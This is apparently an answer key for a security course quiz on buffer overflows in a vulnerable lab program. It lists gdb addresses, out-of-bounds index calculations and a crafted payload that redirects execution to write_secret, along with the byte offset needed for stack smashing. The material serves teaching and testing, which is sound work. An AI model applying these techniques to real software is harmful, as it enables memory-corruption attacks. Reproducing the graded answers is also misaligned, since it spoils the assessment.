# VM BOF QUIZ

##### 1. There is a stack-based overflow in the program.

What is the name of the stack-allocated variable that contains the overflowed buffer?

***wis***

##### 2.  Consider the buffer you just identified:

Running what line of code will overflow the buffer?

***62***

##### 3.  There is another vulnerability, not dependent at all on the first,

involving a non-stack allocated buffer that can be indexed outside its bounds. What variable contains this buffer?

***ptrs***

##### 4.  Consider the buffer you just identified: Running what line of code overflows the buffer?

***101***

##### 5. What is the address of buf?

***0xbfff f130***

##### 6. What is the address of ptrs?

***0x0804 a0d4***

##### 7, What is the address of write_secret?

***0x0804 8534***

##### 8. what is the address of p local to main?

***0xbfff f534***

##### 9. What input do you provide so that ptrs[s] reads/executes the contents of variable p instead of function in ptrs buffer?If ok, you will execute pat_on_back function. Enter your answer as an unsigned integer.


(p-ptrs)/4 is

print /x (0xbffff534 - 0x804a0d4)/4

***0x2dfed518*** or ***771675416***

##### 10. What do you enter so that ptrs[s] reads (and then tries to execute) starting from the 65th byte in buf, ie. the location at buf[64]? Enter your answer as an unsiged integer.

(gdb) print /x &buf[64]

$6 = 0xbffff170

(gdb) print /d  (int*)&buf[64]-(int *)&ptrs

$14 = 771675175

***771675175***

##### 11. What do you replace \xEE\xEE\xEE\xEE with to call write_secret?


(gdb) print &write_secret

$7 = (void (*)(void)) 0x8048534 <write_secret>

***771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08***

##### 12. Suppose you wanted to overflow the wis variable to perform a stack smashing attack. You could do this by entering 2 to call put_wisdom, and then enter enough bytes to overwrite the return address of that function, replacing it with the address of write_secret. How many bytes do you need to enter prior to the address of write_secret?

$10 = ***148***